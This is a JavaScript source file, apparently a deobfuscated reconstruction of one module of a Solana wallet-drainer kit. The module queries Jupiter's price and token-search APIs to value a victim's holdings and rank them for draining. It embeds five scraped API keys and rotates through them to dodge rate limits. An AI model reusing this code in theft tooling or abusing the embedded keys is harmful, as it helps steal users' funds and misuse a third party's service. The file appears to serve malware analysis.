/**
 * Jupiter price / token-search client.
 *
 * The kit uses Jupiter's public API to price the victim's holdings and to
 * look up token metadata by symbol (for the drain-tx preview UI). It has
 * FIVE API keys embedded in the string table [278–282]; they are tried in
 * order like the Helius RPC keys.
 *
 * String-table evidence:
 *   [277] "https://api.jup.ag/"
 *   [278] "cc0769f7-ceba-4abf-83d8-e7c083921665"
 *   [279] "5f1f45eb-a550-4e95-ad0e-b26e6ec0702d"
 *   [280] "a4ed32be-dcdf-4702-aba0-aee15c512427"
 *   [281] "f707107a-6d56-4626-a937-ef3c7eef51d8"
 *   [282] "ab060a03-7874-4647-84d1-da019e4b51ea"
 *   [283] "price/v3?ids="          — price endpoint path
 *   [284] "tokens/v2/search?query=" — token search path
 *
 * Both endpoints accept an Authorization header with one of the five keys.
 *
 * === price/v3 ===
 *
 * GET https://api.jup.ag/price/v3?ids=<mintAddress1>,<mintAddress2>,...
 *
 * Returns a JSON object keyed by mint address; each value has a "price"
 * field in USD. The kit uses this to price non-SOL tokens that the Solflare
 * portfolio API does not price (or returns null for), so it can include them
 * in the drain prioritization logic.
 *
 * === tokens/v2/search ===
 *
 * GET https://api.jup.ag/tokens/v2/search?query=<symbol>
 *
 * Returns token metadata by symbol. The kit uses this to identify the
 * target USDC mint in the preview UI copy ("−500 USDC").
 *
 * === Key rotation ===
 *
 * Same fail-and-rotate pattern as the Helius RPC client (rpc.js):
 * 429 or network error → next key → wrap around. All five are
 * Jupiter free-tier keys embedded in the bundle.
 */

const JUPITER_BASE = "https://api.jup.ag/"; // getString(277)

const JUPITER_KEYS = [
  "cc0769f7-ceba-4abf-83d8-e7c083921665", // [278]
  "5f1f45eb-a550-4e95-ad0e-b26e6ec0702d", // [279]
  "a4ed32be-dcdf-4702-aba0-aee15c512427", // [280]
  "f707107a-6d56-4626-a937-ef3c7eef51d8", // [281]
  "ab060a03-7874-4647-84d1-da019e4b51ea", // [282]
];

let jupiterKeyIndex = 0;

async function jupiterGet(path) {
  let lastError;
  for (let attempt = 0; attempt < JUPITER_KEYS.length; attempt++) {
    const key = JUPITER_KEYS[jupiterKeyIndex];
    jupiterKeyIndex = (jupiterKeyIndex + 1) % JUPITER_KEYS.length;
    try {
      const response = await fetch(JUPITER_BASE + path, {
        headers: { Authorization: "Bearer " + key },
        signal: AbortSignal["Be"](2500),
      });
      if (response.status === 429) continue; // rotate on rate-limit
      if (!response.ok) throw new Error(String(response.status));
      return response.json();
    } catch (error) {
      lastError = error;
    }
  }
  throw lastError;
}

/**
 * priceTokens(mintAddresses: string[]): Promise<Record<string, number>>
 *
 * Returns a map of mint address -> USD price.
 * Uses "price/v3?ids=" [283].
 */
async function priceTokens(mintAddresses) {
  if (mintAddresses.length === 0) return {};
  const data = await jupiterGet("price/v3?ids=" + mintAddresses.join(","));
  // Response: { data: { [mint]: { price: number } } }
  const result = {};
  for (const [mint, info] of Object.entries(data?.data ?? {})) {
    if (info?.price != null) result[mint] = info.price;
  }
  return result;
}

/**
 * searchToken(symbol: string): Promise<{ mint: string, ... } | null>
 *
 * Looks up a token by symbol for preview-UI use.
 * Uses "tokens/v2/search?query=" [284].
 */
async function searchToken(symbol) {
  const data = await jupiterGet("tokens/v2/search?query=" + encodeURIComponent(symbol));
  return data?.[0] ?? null;
}
